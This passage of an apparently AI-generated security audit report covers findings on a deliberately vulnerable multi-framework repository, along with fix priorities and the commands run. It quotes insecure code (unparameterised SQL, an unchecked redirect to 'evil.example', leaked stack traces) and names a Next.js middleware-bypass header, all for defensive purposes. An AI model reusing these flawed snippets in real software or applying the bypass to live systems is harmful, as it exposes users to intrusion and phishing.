- **Status**: To verify manually: no lockfile exists in the repository, so `npm audit`, `bun audit`, `composer audit` could not run (see Appendix). Check the version actually installed/deployed and, for Next.js, the hosting platform (self-hosted deployments are affected; Vercel-hosted ones are not).

**Evidence**
```json
4  "dependencies": { "next": "15.1.0", "@supabase/supabase-js": "2.45.0", "@supabase/ssr": "0.5.2" }
```
Other manifests pin old versions as well: `django/requirements.txt:1-3` (`Django==5.0.0`, `djangorestframework==3.15.0`), `flask/requirements.txt:1` (`flask==3.0.0`), `fastapi/requirements.txt:1` (`fastapi==0.110.0`), `express/package.json` (`express 4.19.2`, `mongoose 8.2.0`), `go/go.mod:6` (`gin v1.9.1`), `laravel/composer.json` (`^11.0`, no `composer.lock`).

**Concrete impact**
Next.js below 15.2.3 is vulnerable to CVE-2025-29927: the `x-middleware-subrequest` header skips the middleware entirely, which is the only protection of `/dashboard` here. The other pinned versions predate several published security fixes (to be confirmed by an audit run with lockfiles).

**Proposed fix**
```diff
--- a/package.json
+++ b/package.json
@@ 4 @@
-  "dependencies": { "next": "15.1.0", ...
+  "dependencies": { "next": "^15.2.3", ...
```
Commit lockfiles for every project and run `npm audit --omit=dev` / `bun audit`, `composer audit`, `pip-audit -r requirements.txt`, `govulncheck ./...`.

---

### SEC-42: PHP login: session fixation and open redirect

- **Severity**: Medium
- **OWASP category**: A07, Identification and authentication failures
- **Location**: `php/login.php:8-9`
- **Status**: Confirmed

**Evidence**
```php
7  if ($user && $user['password'] === md5($_POST['password'])) {
8      $_SESSION['user_id'] = $user['id'];
9      header('Location: ' . $_GET['next']);
10 }
```
No `session_regenerate_id(true)`, no `exit` after `header('Location')`, and `next` is redirected to unchecked.

**Concrete impact**
An attacker who plants a session id in the victim's browser reuses it after login (fixation). `?next=https://evil.example` turns the login page into a phishing redirector, and without `exit` the rest of the script still runs.

**Proposed fix**
```diff
--- a/php/login.php
+++ b/php/login.php
@@ 8,9 @@
-    $_SESSION['user_id'] = $user['id'];
-    header('Location: ' . $_GET['next']);
+    session_regenerate_id(true);
+    $_SESSION['user_id'] = $user['id'];
+    $next = $_GET['next'] ?? '/';
+    header('Location: ' . (preg_match('#^/(?!/)#', $next) ? $next : '/'));
+    exit;
```
Also set cookie params (`httponly`, `secure`, `samesite`) before `session_start()`.

---

### SEC-43: No rate limiting on login (Express, PHP)

- **Severity**: Medium
- **OWASP category**: A07, Identification and authentication failures
- **Location**: `express/server.js:13`, `php/login.php:4-7`
- **Status**: Confirmed in code (no limiter in the handlers or upstream middleware; a reverse proxy outside the repo could still add one)

**Evidence**
```js
// express/server.js
10  app.use(cors());
11  app.use(express.json());
13  app.post("/login", async (req, res) => {
```
```php
// php/login.php
4  $email = $_POST['email'];
5  $res = $pdo->query("SELECT * FROM users WHERE email = '" . $email . "'");
```

**Concrete impact**
Unlimited password guessing against `/login` (and credential stuffing; the MD5 hashes of SEC-23 make offline attacks even easier).

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 11,13 @@
 app.use(express.json());
+app.use("/login", require("express-rate-limit")({ windowMs: 15 * 60 * 1000, max: 10 }));
```
For PHP, add an attempts counter per IP/account (Redis or a table) before the query, or rate limit at the reverse proxy (`limit_req`).

---

### SEC-44: Verbose errors returned to clients

- **Severity**: Medium
- **OWASP category**: A09, Security logging and monitoring failures
- **Location**: `php/config.php:2`, `express/server.js:32`, `go/main.go:33`
- **Status**: Confirmed

**Evidence**
```php
// php/config.php
2  ini_set('display_errors', 1);
```
```js
// express/server.js
32  app.use((err, req, res, next) => res.status(500).json({ error: err.stack }));
```
```go
// go/main.go
32  		if err := row.Scan(&email); err != nil {
33  			c.JSON(500, gin.H{"error": err.Error()})
```

**Concrete impact**
Stack traces, file paths and raw SQL driver errors are returned to anonymous clients; they speed up exploitation of the injections above (error-based SQL injection, path disclosure).

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 32 @@
-app.use((err, req, res, next) => res.status(500).json({ error: err.stack }));
+app.use((err, req, res, next) => { console.error(err); res.status(500).json({ error: "Internal error" }); });
--- a/go/main.go
+++ b/go/main.go
@@ 33 @@
-			c.JSON(500, gin.H{"error": err.Error()})
+			log.Println(err)
+			c.JSON(500, gin.H{"error": "internal error"})
```
(`display_errors` is fixed in SEC-38.)

---

### SEC-45: Hardening gaps: no security headers, public FastAPI docs, Go server without timeouts

- **Severity**: Low
- **OWASP category**: A05, Security misconfiguration
- **Location**: repository root (no `next.config.*`), `fastapi/main.py:5`, `go/main.go:50`
- **Status**: Confirmed

**Evidence**
```
$ ls next.config.*
ls: cannot access 'next.config.*': No such file or directory
```
```python
# fastapi/main.py
5  app = FastAPI()
```
```go
// go/main.go
50  	http.ListenAndServe(":8080", r)
```

**Concrete impact**
Next.js sends no CSP, HSTS, `X-Content-Type-Options` or frame protection (relevant with the XSS of SEC-37); FastAPI exposes `/docs` and `/openapi.json`, mapping every endpoint for an attacker; the Go server has no `ReadHeaderTimeout` (Slowloris) and no request body limit.

**Proposed fix**
```diff
--- /dev/null
+++ b/next.config.ts
@@ @@
+export default {
+  poweredByHeader: false,
+  async headers() {
+    return [{ source: "/(.*)", headers: [
+      { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" },
+      { key: "X-Content-Type-Options", value: "nosniff" },
+      { key: "X-Frame-Options", value: "DENY" },
+      { key: "Content-Security-Policy", value: "default-src 'self'; frame-ancestors 'none'" },
+    ]}];
+  },
+};
--- a/fastapi/main.py
+++ b/fastapi/main.py
@@ 5 @@
-app = FastAPI()
+app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)
--- a/go/main.go
+++ b/go/main.go
@@ 50 @@
-	http.ListenAndServe(":8080", r)
+	srv := &http.Server{Addr: ":8080", Handler: r, ReadHeaderTimeout: 5 * time.Second, ReadTimeout: 15 * time.Second, WriteTimeout: 15 * time.Second}
+	srv.ListenAndServe()
```

---

## Strengths

- Row Level Security is enabled on `profiles` and `comments` (`supabase/migrations/20250101000000_init.sql:7,17`), so those tables are not fully open by default (the policies themselves are the problem, see SEC-05 and SEC-25).
- The Supabase server client uses the anon key for the middleware session (`middleware.ts:6`) and the privileged key is read from a non-`NEXT_PUBLIC_` variable in server code (`app/actions.ts:4`, `app/api/invoices/[id]/route.ts:3`).
- The Go JWT library `golang-jwt/jwt/v5` is used (`go/go.mod:8`), which rejects the `none` algorithm by default, and the `/convert` route at least has an auth hook attached (`go/main.go:38`), even though that hook is broken (SEC-17).
- FastAPI types the path parameter `order_id: int` (`fastapi/main.py:14`), which limits the injection in `delete_order` to integers.
- Flask `yaml` is pinned to PyYAML 6 (`flask/requirements.txt:3`), where `safe_load` is the default in the plain `load()` call; the vulnerability exists only because the full `Loader` is passed explicitly (`flask/app.py:21`).
- The Firestore `orders` and `users` blocks (`firebase/firestore.rules:4-9`) show an intention to restrict by collection, and Firebase Storage/RTDB rules files are versioned and referenced from `firebase/firebase.json:1`, which makes review and deployment of rules reproducible.

## Fix priorities

1. **SEC-01 and SEC-02**: rotate the Stripe key and the Supabase `service_role` key, add `.gitignore`, `git rm --cached .env`, move the key out of `NEXT_PUBLIC_*` (30 min, rotation first)
2. **SEC-04, SEC-05, SEC-06, SEC-26**: new Supabase migration enabling RLS on `invoices`, replacing the `profiles` policy and revoking `add_credits` from `anon`/`authenticated`, adding `security_invoker` to the view (1 h)
3. **SEC-07, SEC-08, SEC-40**: replace the Firebase rules with owner-based rules, deploy them, and add auth checks to both Cloud Functions (2 h)
4. **SEC-09, SEC-10, SEC-11, SEC-12, SEC-13, SEC-14, SEC-15, SEC-19**: switch every SQL query to parameters, allowlist the `include`, fix the PHP upload, remove `render_template_string` concatenation, `pickle`, `yaml.Loader` and `sh -c` (1 day)
5. **SEC-17, SEC-03, SEC-18, SEC-20, SEC-21, SEC-22**: make authentication real on FastAPI, Go, Express, Next.js and Django (JWT verification, `Abort()`, `Depends`, `IsAuthenticated`), close the PocketBase rules, and lock down the MySQL account, root password, and published ports (1 day)

## Appendices

### Commands run
```
bash skills/backend-security-audit/scripts/detect_stack.sh <TARGET>
    -> stacks: nextjs, supabase, pocketbase, php-mysql, flask, fastapi, django, go, node-express, laravel, firebase, mysql
    -> lockfiles: [] ; available_tools: bun, npm, composer, git
git -C <TARGET> rev-parse --short HEAD                 -> 4390f6b
bash skills/backend-security-audit/scripts/find_secrets.sh  <TARGET>
bash skills/backend-security-audit/scripts/grep_patterns.sh <TARGET> "nextjs,supabase,pocketbase,php-mysql,flask,fastapi,django,go,node-express,laravel,firebase,mysql"
git ls-files                                           (inventory of sensitive files, then every file read in full)
git show 4390f6b --stat ; git show 4390f6b -- .env     (confirm the key in history)
npm audit --omit=dev   (root)                          -> npm error ENOLOCK: requires an existing lockfile
npm audit --omit=dev   (express/, firebase/functions/) -> npm error ENOLOCK
bun audit                                              -> error: Lockfile not found
composer audit         (laravel/)                      -> "No packages - skipping audit." (no composer.lock)
pip-audit -r requirements.txt                          -> not run: pip-audit is not installed
govulncheck ./...                                      -> not run: govulncheck is not installed
```
No audit tool could produce a vulnerability report; creating lockfiles would have modified the project (forbidden by the read-only rule). `scan_rls.sql` and `scan_mysql.sql` were not run (no database access provided).

### Discarded leads (false positives)
| Location | Pattern | Reason |
|---|---|---|
| `.env:2` | `secret_in_public_env` / `service_role_client_side` | Kept as a finding (SEC-02); value `fake` is not a JWT, so its role cannot be decoded, but the variable name and client import prove the intent. |
| `django/shop/views.py:23` | `mark_safe` | Value is placed in a `JsonResponse`, not an HTML template; `mark_safe` has no effect there, so no XSS. Removed in the SEC-33 fix as noise. |
| `django/shop/views.py:26` | `csrf_exempt` | Applies to `search`, a read-only view with no state change and no cookie-authenticated action. Not a CSRF issue (the injection inside is SEC-10). |
| `go/main.go:49` | `weak_hash` (md5), `non_crypto_random` (`math/rand`) | `_ = md5.Sum([]byte(fmt.Sprint(rand.Int())))` discards the result; neither is used for a password or a token. Dead code, no security impact. |
| `go/main.go:18` | `jwt_parse_to_check` (Info) | Triaged: confirmed as a real problem, reported in SEC-17. |
| `middleware.ts:10` | `endpoint_auth_rate_limit` | False positive: the line is a redirect to `/login`, not an authentication endpoint (the pattern matched the word "login"). |
| `express/server.js:13` (listed twice) | `endpoint_auth_rate_limit` | Duplicate output line; reported once in SEC-43. |
| `php/login.php:7` | `md5_sha1` (Low) | Duplicate of `weak_password_hash` (High): md5 is used to hash a password, reported in SEC-23. |
| `php/upload.php:6` | `include_variable` (Medium) | Duplicate of `include_user_input` (Critical), reported in SEC-12. |
| `php/login.php:3`, `php/upload.php:2` | `session_start` (Info) | Inventory only; used as evidence in SEC-13 and SEC-42. |
| `supabase/migrations/...:21` | `security_definer` | Not a false positive: reported in SEC-06 (and `mysql/init.sql:14` in SEC-24). |
| `app/actions.ts:4`, `app/api/invoices/[id]/route.ts:3` | `service_role_server_to_check` (Info) | Server-side use of `service_role` is allowed in principle; the real issue is the missing auth check, reported in SEC-03. |
| `django/shop/settings.py:6` | `insecure_cookie` (Low) | Merged into SEC-35. |
| `mysql/docker-compose.yml:3` | `outdated_version` | Merged into SEC-22. |

### Not verified
- Live database state: `scan_rls.sql` (Supabase/Postgres) and `scan_mysql.sql` (MySQL) were not run; findings rely on `supabase/migrations/20250101000000_init.sql` and `mysql/init.sql`. Dashboard changes (RLS toggled manually, extra grants) are not visible.
- Supabase `config.toml` is absent: auth settings (email confirmation, password length, redirect URLs, rate limits) and Edge Functions (`verify_jwt`) could not be reviewed; no storage buckets are defined in the migrations.
- Firebase: whether the console holds newer rules than the repository (SEC-07, SEC-40), enabled sign-in providers, App Check (not configured in the repository).
- PocketBase: the `users` collection, superuser settings, rate limits and `/_/` exposure are not in the repository (`pb_data` absent); file fields and deployment flags (`--http`, `--dev`) not visible.
- Files referenced but missing from the repository: `express/models/User.js`, `django/shop/models.py` and `urls.py` (so the `UserViewSet` route registration is assumed), `laravel/bootstrap`, `config/`, `.env`, `app/Http/Middleware` (so `APP_DEBUG`, `APP_KEY`, CSRF exclusions and the `auth` middleware group could not be reviewed), the `db` object in `fastapi/main.py`.
- Dependency vulnerabilities (SEC-41): no lockfiles and no `pip-audit` / `govulncheck`; commands to run: `npm audit --omit=dev` (after `npm i --package-lock-only` in a copy), `bun audit`, `composer audit`, `pip-audit -r requirements.txt`, `govulncheck ./...`.
- Flask production entry point (Dockerfile/Procfile absent), reverse proxy or WAF in front of any service, TLS termination, infrastructure and dynamic testing.
- Stacks covered with the loaded checklists only; Gin, PyJWT and mysql2 version-specific CVEs were not looked up.
